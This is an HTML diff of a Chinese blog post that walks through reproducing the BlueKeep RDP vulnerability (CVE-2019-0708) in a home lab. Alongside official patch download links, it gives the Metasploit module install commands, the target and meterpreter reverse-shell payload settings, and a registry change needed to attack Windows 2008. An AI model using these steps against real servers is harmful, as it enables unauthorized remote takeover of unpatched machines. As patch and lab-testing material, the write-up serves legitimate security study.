@@ -54,11 +54,13 @@
 
   <h1 class="post-title">CVE-2019-0708远程桌面代码执行漏洞复现</h1>
   <section class="post-content article-entry">
-    <h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>Windows系列服务器于2019年5月15号，被爆出高危漏洞，该漏洞影响范围较广，Windows2003、Windows2008、Windows2008 R2、Windows xp系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的。</p>
+    <h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>等了几个月，终于在今年9月7日凌晨有大佬发出了利用脚本EXP。</p>
+<p>引用某大佬写的漏洞介绍</p>
+<p>Windows系列服务器于2019年5月15号，被爆出高危漏洞，该漏洞影响范围较广，Windows2003、Windows2008、Windows2008 R2、Windows XP系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的。</p>
 <p>这个漏洞是今年来说危害严重性最大的漏洞，跟之前的勒索，永恒之蓝病毒差不多。</p>
 <p>CVE-2019-0708漏洞是通过检查用户的身份认证，导致可以绕过认证，不用任何的交互，直接通过rdp协议进行连接发送恶意代码执行命令到服务器中去。</p>
 <p>如果被攻击者利用，会导致服务器入侵，中病毒，像WannaCry 永恒之蓝漏洞一样大规模的感染。</p>
-<h3 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h3><ul>
+<h2 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h2><ul>
 <li><p>Windows 7</p>
 </li>
 <li><p>Windows Server 2008 R2</p>
@@ -70,7 +72,15 @@
 <li><p>Windows XP</p>
 </li>
 </ul>
-<h3 id="各版本补丁下载"><a href="#各版本补丁下载" class="headerlink" title="各版本补丁下载"></a>各版本补丁下载</h3><p>1.Windows Server 2008 漏洞补丁系列下载地址</p>
+<h2 id="各版本补丁下载"><a href="#各版本补丁下载" class="headerlink" title="各版本补丁下载"></a>各版本补丁下载</h2><p>Windows 7、Windows 2008(R2) 微软CVE-2019-0708补丁详情地址：<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708</a></p>
+<p>1.Windows 7 漏洞补丁系列下载地址</p>
+<pre><code>Windows 7 SP1 32位系统：
+
+http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu
+
+Windows 7 SP1 64位系统：
+
+http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu</code></pre><p>2.Windows Server 2008 漏洞补丁系列下载地址</p>
 <pre><code>Windows Server 2008 32位系统:
 
 http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x86_832cf179b302b861c83f2a92acc5e2a152405377.msu
@@ -89,14 +99,14 @@ http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/wind
 
 Windows Server 2008 Itanium:
 
-http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499180-ia64_805e448d48ab8b1401377ab9845f39e1cae836d4.msu</code></pre><p>2.Windows Server 2003 漏洞补丁系列下载地址</p>
+http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499180-ia64_805e448d48ab8b1401377ab9845f39e1cae836d4.msu</code></pre><p>3.Windows Server 2003 漏洞补丁系列下载地址</p>
 <pre><code>Windows Server 2003 32位系统:
 
 http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x86-custom-chs_4892823f525d9d532ed3ae36fc440338d2b46a72.exe
 
 Windows Server 2003 64位系统:
 
-http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-chs_f2f949a9a764ff93ea13095a0aca1fc507320d3c.exe</code></pre><p>3.Windows XP 漏洞补丁系列下载地址</p>
+http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-chs_f2f949a9a764ff93ea13095a0aca1fc507320d3c.exe</code></pre><p>4.Windows XP 漏洞补丁系列下载地址</p>
 <pre><code>Windows XP SP3 32位系统:
 
 http://download.windowsupdate.com/c/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-custom-chs_718543e86e06b08b568826ac13c05f967392238c.exe
@@ -107,11 +117,11 @@ http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb450
 
 Windows XP SP3 for XPe:
 
-http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-embedded-custom-chs_96da48aaa9d9bcfe6cd820f239db2fe96500bfae.exe</code></pre><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>攻击机：Kali Linux 2019.03版</p>
+http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-embedded-custom-chs_96da48aaa9d9bcfe6cd820f239db2fe96500bfae.exe</code></pre><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：Kali Linux 2019.03版</p>
 <p>攻击机IP：192.168.1.12</p>
 <p>靶机：Windows 7 SP1(6.1.7601)</p>
 <p>靶机IP：192.168.1.10</p>
-<h3 id="导入MSF攻击模块"><a href="#导入MSF攻击模块" class="headerlink" title="导入MSF攻击模块"></a>导入MSF攻击模块</h3><h4 id="手动下载加入模块"><a href="#手动下载加入模块" class="headerlink" title="手动下载加入模块"></a><strong>手动下载加入模块</strong></h4><p><code>cve_2019_0708_bluekeep_rce.rb</code> 添加 <code>/usr/share/metasploit-framework/modules/exploit/windows/rdp/</code></p>
+<h2 id="导入MSF攻击模块"><a href="#导入MSF攻击模块" class="headerlink" title="导入MSF攻击模块"></a>导入MSF攻击模块</h2><h4 id="手动下载加入模块"><a href="#手动下载加入模块" class="headerlink" title="手动下载加入模块"></a><strong>手动下载加入模块</strong></h4><p><code>cve_2019_0708_bluekeep_rce.rb</code> 添加 <code>/usr/share/metasploit-framework/modules/exploit/windows/rdp/</code></p>
 <p><code>rdp.rb</code> 替换 <code>/usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb</code></p>
 <p><code>rdp_scanner.rb</code> 替换 <code>/usr/share//metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</code></p>
 <p><code>cve_2019_0708_bluekeep.rb</code> 替换 <code>/usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</code></p>
@@ -123,27 +133,28 @@ http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86
 <p><code>cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/</code></p>
 <p><code>cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/</code></p>
 <p><code>cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/</code></p>
-<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="进入MSF设置选项"><a href="#进入MSF设置选项" class="headerlink" title="进入MSF设置选项"></a><strong>进入MSF设置选项</strong></h4><p><img src="/uploads/2019/09/07/2019-09-07-165410.png" alt></p>
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h4 id="进入MSF设置选项"><a href="#进入MSF设置选项" class="headerlink" title="进入MSF设置选项"></a><strong>进入MSF设置选项</strong></h4><p><img src="/uploads/2019/09/07/2019-09-07-165410.png" alt></p>
 <p>大概需要设置三个选项</p>
 <ul>
 <li><p>RHOSTS 靶机IP地址</p>
 </li>
-<li><p>Target 攻击选项(使用 <code>info</code> 命令可以查看到targets)</p>
+<li><p>Target 攻击选项(使用info命令可以查看到targets)</p>
 </li>
-<li><p>Payloads 攻击载荷</p>
+<li><p>Payloads 攻击载荷(set payload windows/x64/meterpreter/reverse_tcp)</p>
 </li>
 </ul>
-<h4 id="需要注意的地方"><a href="#需要注意的地方" class="headerlink" title="需要注意的地方"></a><strong>需要注意的地方</strong></h4><p>使用最多的是 target 2 和 3，1 因为是真实环境，没有测试，2 和 3有时候会蓝屏，亲测但是多试几次可能就能拿到shell。</p>
+<h4 id="需要注意的地方"><a href="#需要注意的地方" class="headerlink" title="需要注意的地方"></a><strong>需要注意的地方</strong></h4><p>使用最多的是 target 2 和 3，1 因为是真实环境，没有测试，2 和 3有时候会蓝屏，亲测但是多试几次可能就能拿到shell，因为补丁可能存在阉割版或者刚发布，所以不太稳定。</p>
 <p>还有就是Payloads一定要设置，不设置肯定返回不了shell，命令： <code>set payload windows/x64/meterpreter/reverse_tcp</code></p>
 <p><img src="/uploads/2019/09/07/2019-09-07-165449.png" alt></p>
 <p>设置完成后，可查看到Payloads选项。</p>
+<p>攻击 Windows 2008(R2) 需要修改注册表 <code>[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\rdpwd\fDisableCam]</code> 值修改为 <code>0</code></p>
 <h4 id="成功获取反弹shell"><a href="#成功获取反弹shell" class="headerlink" title="成功获取反弹shell"></a><strong>成功获取反弹shell</strong></h4><p><img src="/uploads/2019/09/07/2019-09-07-165533.png" alt></p>
 <p>刚开始我也是不断的蓝屏，死活拿不到shell，但是不停的 <code>run</code> 尝试之后，发现已经获取到shell了。</p>
 <p><strong>获取到反弹到的shell</strong></p>
 <p><img src="/uploads/2019/09/07/2019-09-07-164531.png" alt></p>
 <p><strong>Windows 7 IP地址</strong></p>
 <p><img src="/uploads/2019/09/07/2019-09-07-164611.png" alt></p>
-<h3 id="复现总结"><a href="#复现总结" class="headerlink" title="复现总结"></a>复现总结</h3><p>今天一下午都在复现这个漏洞，期间遇到了很多坑，我换了Kali Linux 2019.03版本，尝试没有出现之前的问题。Windows 2008还没有测试，大家可以自行搭建测试。如果获取不到反弹shell或者蓝屏，那就多试几次，或者换个target的再多试几次。希望大家不会出现玄学问题，祝各位复现一路顺风~</p>
+<h2 id="复现总结"><a href="#复现总结" class="headerlink" title="复现总结"></a>复现总结</h2><p>今天一下午都在复现这个漏洞，期间遇到了很多坑，我换了Kali Linux 2019.03版本，尝试没有出现之前的问题。Windows 2008还没有测试，大家可以自行搭建测试。如果获取不到反弹shell或者蓝屏，那就多试几次，或者换个target的再多试几次。希望大家不会出现玄学问题，祝各位复现一路顺风~</p>
 
   </section>
   <footer class="post-footer">
@@ -172,7 +183,7 @@ http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86
     <div class="post-toc">
       <span class="post-toc-title">文章目录</span>
         <div class="post-toc-content">
-          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞介绍"><span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#受影响的版本"><span class="toc-text">受影响的版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#各版本补丁下载"><span class="toc-text">各版本补丁下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实验环境"><span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#导入MSF攻击模块"><span class="toc-text">导入MSF攻击模块</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#手动下载加入模块"><span class="toc-text">手动下载加入模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Kali下载加入模块"><span class="toc-text">Kali下载加入模块</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实验步骤"><span class="toc-text">实验步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#进入MSF设置选项"><span class="toc-text">进入MSF设置选项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#需要注意的地方"><span class="toc-text">需要注意的地方</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#成功获取反弹shell"><span class="toc-text">成功获取反弹shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现总结"><span class="toc-text">复现总结</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞介绍"><span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#受影响的版本"><span class="toc-text">受影响的版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#各版本补丁下载"><span class="toc-text">各版本补丁下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实验环境"><span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#导入MSF攻击模块"><span class="toc-text">导入MSF攻击模块</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#手动下载加入模块"><span class="toc-text">手动下载加入模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Kali下载加入模块"><span class="toc-text">Kali下载加入模块</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#实验步骤"><span class="toc-text">实验步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#进入MSF设置选项"><span class="toc-text">进入MSF设置选项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#需要注意的地方"><span class="toc-text">需要注意的地方</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#成功获取反弹shell"><span class="toc-text">成功获取反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现总结"><span class="toc-text">复现总结</span></a></li>
         </div>
     </div>
 </div>
